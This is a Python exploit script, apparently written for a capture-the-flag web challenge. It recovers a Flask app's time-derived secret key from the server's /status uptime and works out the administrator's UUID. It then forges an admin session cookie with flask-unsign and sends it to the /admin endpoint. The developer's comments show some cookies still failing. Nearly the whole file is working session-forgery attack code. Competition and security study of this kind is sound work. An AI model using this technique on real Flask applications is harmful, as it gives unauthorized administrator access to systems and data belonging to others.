from datetime import datetime, timedelta
import requests
import subprocess
import uuid
import hashlib
secret = uuid.UUID('31333337-1337-1337-1337-133713371337')
# Given values

url = 'http://chal.competitivecyber.club:9999/'
def get_current_status_and_get_key():
    r = requests.get(url+'/status')
    times = r.text.split('<br>')
    current_time_str = ' '.join(times[1].split("Server time: ")[1].strip().split(" "))
    delta_time_str = times[0].split("Server uptime: ")[1].strip()
    print(current_time_str)
    print(delta_time_str)
    # Parse the current time and delta time
    current_time = datetime.strptime(current_time_str, '%Y-%m-%d %H:%M:%S')
    delta_time_parts = list(map(int, delta_time_str.split(':')))  # Convert to integers
    delta_time = timedelta(hours=delta_time_parts[0], minutes=delta_time_parts[1], seconds=delta_time_parts[2])

# Subtract delta_time from current_time
    # Calculate the previous time
    previous_time = current_time - delta_time

# Output the results
    print(f"Current time: '{current_time_str}'")
    print(f"Delta time: '{delta_time_str}'")
    print(f"Start time: '{previous_time.strftime('%Y-%m-%d %H:%M:%S')}'")
    
    # Format to desired string
    formatted_time = previous_time.strftime('%Y%m%d%H%M%S')
    print(formatted_time)
    return hashlib.sha256(f'secret_key_{formatted_time}'.encode()).hexdigest()

def set_admin_uid():
    uid = uuid.uuid5(secret, 'administrator')
    return uid
def set_is_admin_true(SECRET, uid):
    command = [
        'flask-unsign',
        '--sign',
        '--cookie', "{'is_admin': True, 'uid': '"+str(uid)+"', 'username': 'administrator'}",
        '--secret', SECRET
    ]
    # Run the command and capture the output
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT)
        output_str = output.decode('utf-8').strip()  # Decode and strip any whitespace
        print(f"Command output:\n{output_str}")
        return output_str
    except subprocess.CalledProcessError as e:
        print(f"Error occurred:\n{e.output.decode('utf-8').strip()}")

def verify(SECRET, cookie):
    # Create the command to run
    command = [
        'flask-unsign',
        '--unsign',
        '--cookie', cookie,
        '--secret', SECRET
    ]

    # Run the command in a subprocess and capture the output
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT)
        output_str = output.decode('utf-8').strip()  # Decode and strip whitespace
        print(f"Decrypted cookie output:\n{output_str}")
    except subprocess.CalledProcessError as e:
        print(f"Error occurred:\n{e.output.decode('utf-8').strip()}")

SECRET_KEY = get_current_status_and_get_key()
print(SECRET_KEY)
uid = set_admin_uid()
print(uid)
forged_cookie = set_is_admin_true(SECRET_KEY, uid)
verify(SECRET_KEY, forged_cookie)
cookes = {
    'session':forged_cookie
}
### NEED TO SEND THIS COOKIE WTF WTF WTF NOT SENDING
r = requests.get(url+'/admin', cookies=cookes)
print(r.text)
r = requests.get(url+'/user/'+str(uid))
print(r.cookies['session'])
verify(SECRET_KEY, r.cookies['session']) #THE KEY WORKS?????
verify(SECRET_KEY, 'eyJpc19hZG1pbiI6ZmFsc2UsInVpZCI6IjE1NTA1YTVmLWZmYWMtNTY2My04MDllLTQ3ZjJmZTU3ZWUwOSIsInVzZXJuYW1lIjoiYm9iIn0.Zu8L9Q.CCcdz0m_1sHl_c--iC68w6ClLJE')
# Print the cookies from the response
